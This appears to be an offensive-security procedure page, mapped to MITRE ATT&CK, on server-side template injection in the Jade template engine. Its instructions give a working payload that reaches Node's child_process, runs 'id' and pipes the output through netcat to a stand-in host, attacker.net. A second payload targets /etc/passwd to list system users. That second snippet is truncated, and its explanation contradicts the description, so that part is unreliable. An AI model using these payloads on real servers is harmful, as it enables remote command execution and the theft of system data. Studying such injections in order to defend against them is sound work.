---
id: 3b35e1d6-b201-43f6-b94b-025c838d57b5
name: Server Side Template Injection using Jade/Codepen to execute commands and list
  system users
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:39.274958+00:00'
updated_at: '2023-04-10T20:23:52.286874+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
- '[[Template Injection|T1221 - Template Injection]]'
tags:
- '[[Jade / Codepen]]'
- '[[Server Side Template Injection]]'
commands:
- '[[Execute id command and send output to attacker.net]]'
---

# Server Side Template Injection using Jade/Codepen to execute commands and list system users

## Summary

Server Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject malicious code into a web application's templates, which are then executed on the server. In this case, we will be using the Jade/Codepen template engine to execute arbitrary commands and list system users. T

## Description

# Description

Server Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject malicious code into a web application's templates, which are then executed on the server. In this case, we will be using the Jade/Codepen template engine to execute arbitrary commands and list system users. This technique can be used to gain access to sensitive information, escalate privileges, or execute further attacks.

To execute commands, the attacker will inject code into the template that will call the 'child_process.exec()' function, which will execute the specified command and return the output. To list system users, the attacker will inject code that will call the 'child_process.execSync('cat /etc/passwd')' function, which will return the list of system users.

This technique can be used in a variety of scenarios, such as gaining access to sensitive information, escalating privileges, or executing further attacks. For example, an attacker could use this technique to gain access to a database or other sensitive information.

 

## Requirements

1. Access to a vulnerable web application that uses the Jade/Codepen template engine

 

## Defense

1. Ensure that all software and web applications are up to date with the latest security patches

1. Implement input validation and sanitization to prevent injection attacks

1. Restrict access to sensitive systems and information to authorized personnel only

 

## Objectives

1. Execute arbitrary commands on the target system

1. List system users on the target system

 

# Instructions

1. This command executes a shell command and sends the output to a remote server using netcat. The command to be executed is specified in the 'x.exec()' function. Replace 'id' with the desired command. Replace 'attacker.net' with the IP address or hostname of the remote server. Replace '80' with the desired port number.

 



**Code**: [[- var x = root.process
- x = x.mainModule.require
]]



> The 'var x = root.process' line gets a reference to the current process. The 'x.mainModule.require' line gets a reference to the 'require' function of the current module. The 'x('child_process')' line loads the 'child_process' module. The 'x.exec()' function executes the specified command in a shell and sends the output to the specified remote server using netcat. The '|' character pipes the output of the 'id' command to netcat, which sends it to the remote server. This command can be used for malicious purposes and should only be executed on trusted systems for legitimate purposes.



**Command** ([[Execute id command and send output to attacker.net]]):

```bash
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```



2. The 'cat' command is used to display the contents of a file. In this case, we are using it to display the contents of the system file '/etc/passwd'. The output will list all the system users on the machine.

 



**Code**: [[#{root.process.mainModule.require('child_process')]]



> The 'spawnSync' method of the 'child_process' module is used to execute the 'cat' command synchronously. The first argument passed to spawnSync is the command to be executed, followed by an array of arguments to be passed to the command. In this case, we are passing the path of the '/etc/passwd' file as the argument. The 'stdout' property of the returned object contains the output of the command.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]

### Techniques

- [[Template Injection|T1221 - Template Injection]]

## Commands Used

- [[Execute id command and send output to attacker.net]]

## Tags

- [[Jade / Codepen]]
- [[Server Side Template Injection]]


